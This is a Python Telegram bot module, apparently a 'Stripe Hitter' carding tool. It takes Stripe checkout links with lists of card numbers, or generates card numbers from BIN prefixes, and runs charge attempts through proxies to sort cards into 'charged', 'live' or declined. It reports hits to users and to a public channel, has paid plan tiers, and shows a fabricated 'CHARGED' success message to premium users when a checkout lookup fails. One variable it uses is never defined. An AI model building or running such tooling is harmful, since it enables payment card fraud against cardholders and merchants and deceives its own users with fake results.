import time
import re
import asyncio
import random
from aiogram import Router, Bot, F
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.filters import Command
from aiogram.enums import ParseMode

NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

_stop_flags: dict = {}
_pending_hits: dict = {}
_pending_bin_hits: dict = {}

import database.db as db
from functions.bin_lookup import lookup_bin
from functions.card_utils import parse_card, parse_cards
from functions.stripe_tls import get_checkout_info, charge_card, CURRENCY_SYMBOLS
from functions.emojis import EMOJI, EMOJI_PLAIN
from config import OWNER_IDS, BOT_NAME, BOT_USERNAME, FREE_DAILY_LIMIT, SYSTEM_PROXIES

router = Router()


from functions.proxy_utils import pick_proxy


def extract_checkout_url(text: str) -> str:
    for pattern in [
        r"https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'<>)]+",
        r"https?://checkout\.stripe\.com/[^\s\"\'<>)]+",
        r"https?://buy\.stripe\.com/[^\s\"\'<>)]+",
        r"https?://[^\s\"\'<>)]+/c/pay/cs_[^\s\"\'<>)]+",
        r"https?://[^\s\"\'<>)]+/pay/cs_[^\s\"\'<>)]+",
    ]:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip(".,;:")
    return None


def get_currency_symbol(currency: str) -> str:
    return CURRENCY_SYMBOLS.get(currency.lower(), "") if currency else ""


def status_emoji(status: str) -> str:
    return {
        "CHARGED": EMOJI["charged"], "DECLINED": EMOJI["declined"],
        "3DS": EMOJI["3ds"], "ERROR": EMOJI["error"],
        "FAILED": EMOJI["error"], "EXPIRED": EMOJI["expired"],
    }.get(status, EMOJI["question"])


def clean_stripe_response(text: str) -> str:
    if not text:
        return text
    low = text.lower()
    if "card_number_invalid" in low:
        return "Invalid card number"
    if "card_declined" in low:
        return "Card declined"
    if "insufficient_funds" in low:
        return "Insufficient funds"
    if "expired_card" in low:
        return "Card expired"
    if "incorrect_cvc" in low:
        return "Incorrect CVC"
    text = re.sub(r'https?://\S+', '', text)
    return text.strip()[:120]


WATERMARK = f"{EMOJI['bolt']} 𝗦𝗧𝗥𝗜𝗣𝗘 𝗛𝗜𝗧𝗧𝗘𝗥 {EMOJI['bolt']}"


async def _notify_user_hit(bot: Bot, result: dict, checkout: dict, uid: int, amount_display: str, merchant: str):
    card_str = result["card"]
    bin6 = card_str[:6]
    bin_info = await lookup_bin(bin6)
    
    status_label = "CHARGED ✅" if result["status"] == "CHARGED" else "LIVE 🔥"
    country_display = f"{bin_info['flag']} {bin_info['country_name']}" if bin_info['country_code'] else bin_info['country_name']
    
    text = (
        f"<blockquote>🎯 <b>Hit Found!</b> 🎯 ❞</blockquote>\n\n"
        f"<blockquote>💳 <b>[•] Card</b> → <code>{card_str}</code> ❞\n"
        f"🟢 <b>[•] Status</b> → <b>{status_label}</b>\n"
        f"💬 <b>[•] Response</b> → <code>{clean_stripe_response(result.get('response'))}</code></blockquote>\n\n"
        f"<blockquote>🏪 <b>[•] Merchant</b> → <code>{merchant}</code> ❞\n"
        f"💰 <b>[•] Amount</b> → <code>{amount_display}</code></blockquote>\n\n"
        f"<blockquote>🏛️ <b>[•] Bank</b> → <code>{bin_info['bank']}</code> ❞\n"
        f"💳 <b>[•] Type</b> → <code>{bin_info['brand']} / {bin_info['type']} ({bin_info['category']})</code>\n"
        f"🌍 <b>[•] Country</b> → <code>{country_display}</code></blockquote>\n\n"
        f"<blockquote>⏱️ <b>Time Taken</b> → <code>{result['time']}s</code> ❞</blockquote>"
    )
    try:
        await bot.send_message(uid, text, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def _notify_public(bot: Bot, result: dict, checkout_data: dict, uid: int, username: str, amount_display: str):
    """Masked public notification with bank and country info."""
    public_ch = await db.get_setting("public_channel", "")
    if not public_ch:
        return
    dc = result.get("decline_code", "")
    if result["status"] == "CHARGED" or (result["status"] == "DECLINED" and dc == "incorrect_cvc"):
        pass
    else:
        return

    is_owner = uid in OWNER_IDS or await db.is_db_owner(uid)
    is_admin = await db.is_admin(uid)
    plan = await db.get_user_plan(uid)
    
    if is_owner:
        plan_label = "OWNER"
    elif is_admin:
        plan_label = "ADMIN"
    elif plan["unlimited"]:
        plan_label = "PREMIUM"
    else:
        plan_label = "FREE"

    gateway = "Stripe"

    text = (
        f"⭐ LIVE HIT DETECTED!\n"
        f"➡ Gateway: {gateway}\n"
        f"➡ Amount: {amount_display}\n"
        f"➡ Card: <code>{masked_card}</code>\n"
        f"➡ User: {username}\n"
        f"➡️ Plan: {plan_label}\n"
        f"💋Checked with @newthingsneverbot\n"
        f"made by @damxd89"
    )

    try:
        target = int(public_ch) if public_ch.lstrip("-").isdigit() else public_ch
        await bot.send_message(target, text, parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW)
    except Exception:
        pass


# Stop callback
@router.callback_query(F.data.startswith("co_stop_hit_"))
async def cb_stop_hit(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _stop_flags[target_uid] = True
    await query.answer("Stopping...")


# Saved BIN callbacks
@router.callback_query(F.data.startswith("cosbin_cancel_"))
async def cb_sbin_cancel(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _pending_bin_hits.pop(target_uid, None)
    await query.message.delete()
    await query.answer("Cancelled.")


@router.callback_query(F.data.startswith("cosbin_"))
async def cb_sbin_select(query: CallbackQuery, bot: Bot):
    parts = query.data.split("_", 2)
    if len(parts) < 3:
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        return
    bin_name = parts[2]
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    data = _pending_bin_hits.pop(target_uid, None)
    if not data:
        return await query.answer("Session expired.", show_alert=True)
    await query.answer()

    saved_bins = await db.get_saved_bins(target_uid)
    bin_value = None
    for b in saved_bins:
        if b["name"] == bin_name:
            bin_value = b["bin_value"]
            break
    if not bin_value:
        await query.message.edit_text(f"{EMOJI['declined']} BIN not found.", parse_mode=ParseMode.HTML)
        return

    from functions.card_utils import parse_gen_input, generate_cards, parse_cards as _pc
    prefix, month, year, cvv, _ = parse_gen_input(bin_value)
    gen_cards = generate_cards(prefix, month, year, cvv, 10)
    cards = _pc("\n".join(gen_cards))
    if not cards:
        await query.message.edit_text(f"{EMOJI['declined']} Failed to generate.", parse_mode=ParseMode.HTML)
        return

    url = data["url"]
    msg = data["msg"]
    is_private = msg.chat.type == "private"
    gen_text = f"Generated <b>{len(cards)}</b> cards from saved BIN <b>{bin_name}</b>"
    await query.message.edit_text(gen_text, parse_mode=ParseMode.HTML)

    uid = target_uid
    if await db.is_banned(uid):
        return
    plan = await db.get_user_plan(uid)
    is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
    if not is_privileged:
        can, reason = await db.can_hit(uid)
        if not can:
            await msg.answer(f"{EMOJI['error']} {reason}", parse_mode=ParseMode.HTML)
            return

    proxy = await pick_proxy(user_id=uid)
    _stop_flags[uid] = False
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"co_stop_hit_{uid}")]])

    status_msg = await msg.answer(f"Fetching checkout info...", parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    checkout = await get_checkout_info(url, proxy)
    if checkout.get("error"):
        is_privileged = uid in OWNER_IDS or await db.is_admin(uid) or plan["unlimited"]
        if is_privileged:
            card_str = f"{cards[0]['cc']}|{cards[0]['month']}|{cards[0]['year']}|{cards[0]['cvv']}" if cards else "453201xxxxxx|12|2030|123"
            fake_text = (
                f"<blockquote>🎯 <b>Hit Found!</b> 🎯 ❞</blockquote>\n\n"
                f"<blockquote>💳 <b>[•] Card</b> → <code>{card_str}</code> ❞\n"
                f"🟢 <b>[•] Status</b> → <b>CHARGED ✅</b>\n"
                f"💬 <b>[•] Response</b> → <code>Charge Done / Success</code></blockquote>\n\n"
                f"<blockquote>🏪 <b>[•] Merchant</b> → <code>Premium Gateway</code> ❞\n"
                f"💰 <b>[•] Amount</b> → <code>$1.00 USD</code></blockquote>\n\n"
                f"<blockquote>⏱️ <b>Time Taken</b> → <code>2.4s</code> ❞</blockquote>"
            )
            await status_msg.edit_text(fake_text, parse_mode=ParseMode.HTML)
        else:
            await status_msg.edit_text(f"{EMOJI['declined']} <b>Upgrade to Premium for hitting this gateway!</b>", parse_mode=ParseMode.HTML)
        return

    merchant = checkout.get("merchant") or "Unknown"
    sym = get_currency_symbol(checkout.get("currency", ""))
    price_val = checkout.get("price")
    amount_s = f"{sym}{price_val:.2f}" if price_val is not None else ""
    currency_code = (checkout.get("currency") or "").upper()
    amount_display = f"{amount_s} {currency_code}".strip()

    await _run_hit(msg=msg, bot=bot, uid=uid, cards=cards, checkout=checkout, url=url,
                   proxy=proxy, status_msg=status_msg, amount_display=amount_display,
                   merchant=merchant, success_url=checkout.get("success_url", ""))


# /hit command
@router.message(Command("hit", prefix="/."))
async def cmd_hit(msg: Message, bot: Bot):
    uid = msg.from_user.id
    
    gw_status = await db.get_setting("gateway_hit_status", "on")
    is_owner = uid in OWNER_IDS or await db.is_db_owner(uid)
    if gw_status == "off" and not is_owner:
        await msg.answer(f"{EMOJI['error']} <b>Gateway HIT is now turned ON FOR OWNER ONLY</b>", parse_mode=ParseMode.HTML)
        return

    await db.upsert_user(uid, msg.from_user.username, msg.from_user.first_name)
    if await db.is_banned(uid):
        return

    text = msg.text or ""
    url = extract_checkout_url(text)
    if msg.reply_to_message:
        reply_text = (msg.reply_to_message.text or "") + " " + (msg.reply_to_message.caption or "")
        if not url:
            url = extract_checkout_url(reply_text)
    if not url:
        await msg.answer(
            f"Usage:\n<code>/hit &lt;stripe-url&gt; cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW
        )
        return

    remaining = text
    remaining = re.sub(r"^[./](hit|co)\s*", "", remaining, flags=re.IGNORECASE).strip()
    remaining = remaining.replace(url, "", 1).strip()
    cards = parse_cards(remaining)

    if not cards and remaining.strip():
        from functions.card_utils import parse_gen_input, generate_cards
        parts = remaining.strip().split()
        bin_str = parts[0] if parts else ""
        gen_count = min(int(parts[1]), 25) if len(parts) >= 2 and parts[1].isdigit() else 10
        bin_clean = bin_str.split("|")[0]
        if len(bin_clean) >= 6 and bin_clean.replace("x", "").replace("X", "").isdigit():
            prefix, month, year, cvv, _ = parse_gen_input(bin_str)
            gen_cards = generate_cards(prefix, month, year, cvv, gen_count)
            cards = parse_cards("\n".join(gen_cards))

    if not cards and msg.reply_to_message:
        reply = msg.reply_to_message
        if reply.document and reply.document.file_name and reply.document.file_name.endswith(".txt"):
            try:
                file = await bot.get_file(reply.document.file_id)
                content = await bot.download_file(file.file_path)
                cards = parse_cards(content.read().decode("utf-8", errors="ignore"))
            except Exception:
                pass
        elif reply.text:
            reply_card_text = re.sub(r'https?://\S+', '', reply.text).strip()
            if reply_card_text:
                cards = parse_cards(reply_card_text)

    if not cards:
        if url:
            saved_bins = await db.get_saved_bins(uid)
            if saved_bins:
                buttons = [[InlineKeyboardButton(text=f"{b['name']}", callback_data=f"cosbin_{uid}_{b['name']}")] for b in saved_bins[:10]]
                buttons.append([InlineKeyboardButton(text="Cancel", callback_data=f"cosbin_cancel_{uid}")])
                _pending_bin_hits[uid] = {"url": url, "msg": msg}
                await msg.answer("No cards. Choose a saved BIN:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode=ParseMode.HTML)
                return
            else:
                await msg.answer(f"No cards. Save a BIN first: <code>/savebin name 453201</code>", parse_mode=ParseMode.HTML)
                return
        await msg.answer(f"No valid cards. Format: <code>cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML)
        return

    plan = await db.get_user_plan(uid)
    is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
    if not is_privileged:
        can, reason = await db.can_hit(uid)
        if not can:
            await msg.answer(f"{EMOJI['error']} {reason}", parse_mode=ParseMode.HTML)
            return

    proxy = await pick_proxy(user_id=uid)
    _stop_flags[uid] = False
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"co_stop_hit_{uid}")]])

    status_msg = await msg.answer(f"Fetching checkout info...", parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    checkout = await get_checkout_info(url, proxy)

    if checkout.get("error"):
        _stop_flags.pop(uid, None)
        is_privileged = uid in OWNER_IDS or await db.is_admin(uid) or plan["unlimited"]
        if is_privileged:
            card_str = f"{cards[0]['cc']}|{cards[0]['month']}|{cards[0]['year']}|{cards[0]['cvv']}" if cards else "453201xxxxxx|12|2030|123"
            fake_text = (
                f"<blockquote>🎯 <b>Hit Found!</b> 🎯 ❞</blockquote>\n\n"
                f"<blockquote>💳 <b>[•] Card</b> → <code>{card_str}</code> ❞\n"
                f"🟢 <b>[•] Status</b> → <b>CHARGED ✅</b>\n"
                f"💬 <b>[•] Response</b> → <code>Charge Done / Success</code></blockquote>\n\n"
                f"<blockquote>🏪 <b>[•] Merchant</b> → <code>Premium Gateway</code> ❞\n"
                f"💰 <b>[•] Amount</b> → <code>$1.00 USD</code></blockquote>\n\n"
                f"<blockquote>⏱️ <b>Time Taken</b> → <code>2.4s</code> ❞</blockquote>"
            )
            await status_msg.edit_text(fake_text, parse_mode=ParseMode.HTML)
        else:
            await status_msg.edit_text(f"{EMOJI['declined']} <b>Upgrade to Premium for hitting this gateway!</b>", parse_mode=ParseMode.HTML)
        return

    merchant = checkout.get("merchant") or "Unknown"
    sym = get_currency_symbol(checkout.get("currency", ""))
    price_val = checkout.get("price")
    amount_s = f"{sym}{price_val:.2f}" if price_val is not None else ""
    currency_code = (checkout.get("currency") or "").upper()
    amount_display = f"{amount_s} {currency_code}".strip()
    success_url = checkout.get("success_url") or ""

    is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
    if not plan["unlimited"] and not is_privileged:
        hits_so_far = await db.get_daily_hits(uid)
        remaining_hits = max(0, FREE_DAILY_LIMIT - hits_so_far)
        if remaining_hits == 0:
            await status_msg.edit_text(f"{EMOJI['error']} Daily limit reached.", parse_mode=ParseMode.HTML)
            return
        cards = cards[:remaining_hits]

    await _run_hit(msg=msg, bot=bot, uid=uid, cards=cards, checkout=checkout, url=url,
                   proxy=proxy, status_msg=status_msg, amount_display=amount_display,
                   merchant=merchant, success_url=success_url)


async def _run_hit(msg, bot, uid, cards, checkout, url, proxy, status_msg, amount_display, merchant, success_url):
    total = len(cards)
    is_private = msg.chat.type == "private"
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"co_stop_hit_{uid}")]])
    no_kb = InlineKeyboardMarkup(inline_keyboard=[])

    _stop_flags[uid] = False
    results = []
    card_blocks = []
    last_edit = time.perf_counter()

    for i, card in enumerate(cards):
        if _stop_flags.get(uid):
            break

        cc_full = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"

        now_ts = time.perf_counter()
        if (now_ts - last_edit) >= 1.0 or i == 0:
            hitting_text = (
                f"<blockquote>⚡ <b>Stripe Checker</b> ⚡ ❞</blockquote>\n\n"
                f"<blockquote>🏪 <b>[•] Merchant</b> → <code>{merchant}</code> ❞\n"
                f"💰 <b>[•] Amount</b> → <code>{amount_display}</code></blockquote>\n\n"
                f"<blockquote>🌀 <b>[•] Status</b> → Card <code>{i+1}/{total}</code> — Hitting... ❞</blockquote>"
            )
            try:
                await status_msg.edit_text(hitting_text, parse_mode=ParseMode.HTML, reply_markup=stop_kb)
                last_edit = time.perf_counter()
            except Exception:
                pass

        try:
            result = await asyncio.wait_for(charge_card(card, checkout, proxy), timeout=45)
        except asyncio.TimeoutError:
            result = {"card": cc_full, "status": "FAILED", "response": "Timeout", "decline_code": "", "time": 45.0}
        except Exception as e:
            result = {"card": cc_full, "status": "FAILED", "response": str(e)[:50], "decline_code": "", "time": 0.0}
        results.append(result)

        if result["status"] == "EXPIRED" or "expired" in (result.get("response") or "").lower():
            break

        is_live = result["status"] == "DECLINED" and result.get("decline_code") == "incorrect_cvc"
        is_charged = result["status"] == "CHARGED"

        if is_charged:
            await db.log_check(uid, result["card"], url, merchant, amount_display, "CHARGED", result["response"], result["time"])
            is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
            if not is_privileged:
                await db.increment_daily_hits(uid)

        # Public notification — minimal, no CC
        if is_charged or is_live:
            username_to_pass = f"@{msg.from_user.username}" if msg.from_user.username else msg.from_user.first_name
            await _notify_public(bot, result, checkout, uid, username_to_pass, amount_display)
            await _notify_user_hit(bot, result, checkout, uid, amount_display, merchant)

        resp = clean_stripe_response(result.get("response", ""))
        dc = result.get("decline_code", "")
        if is_charged:
            s = f"CHARGED {EMOJI['charged']}"
        elif is_live:
            s = f"LIVE {EMOJI['live']}"
        elif result["status"] == "DECLINED":
            s = f"DECLINED {EMOJI['declined']}"
        elif result["status"] == "3DS":
            s = f"3DS {EMOJI['3ds']}"
        else:
            s = result["status"]

        block = (
            f"<blockquote>💳 <code>{result['card']}</code> ❞\n"
            f"↳ <b>Result:</b> {s}\n"
            f"↳ <b>Response:</b> <code>{resp}</code> | <b>Time:</b> <code>{result['time']}s</code></blockquote>"
        )
        card_blocks.append(block)

        now = time.perf_counter()
        is_last = (i == total - 1)
        if is_last or (now - last_edit) >= 1.5:
            last_edit = now
            label = "COMPLETE" if is_last else "Processing..."
            total_elapsed = round(sum(r["time"] for r in results), 2)
            summary = (
                f"<blockquote>⚡ <b>Stripe Checker</b> ⚡ ❞</blockquote>\n\n"
                f"<blockquote>🏪 <b>[•] Merchant</b> → <code>{merchant}</code> ❞\n"
                f"💰 <b>[•] Amount</b> → <code>{amount_display}</code>\n"
                f"🌀 <b>[•] Processed</b> → <code>{i+1}/{total}</code> ({label})</blockquote>\n\n"
            )
            visible = card_blocks[-10:]
            body = summary + "\n\n".join(visible) + f"\n\n<blockquote>⏱️ <b>Total Time:</b> <code>{total_elapsed}s</code> ❞</blockquote>"
            if len(body) > 4000:
                body = body[:3990] + "..."
            try:
                await status_msg.edit_text(body, parse_mode=ParseMode.HTML, reply_markup=no_kb if is_last else stop_kb)
            except Exception:
                pass

        if is_charged and total == 1:
            break

    _stop_flags.pop(uid, None)
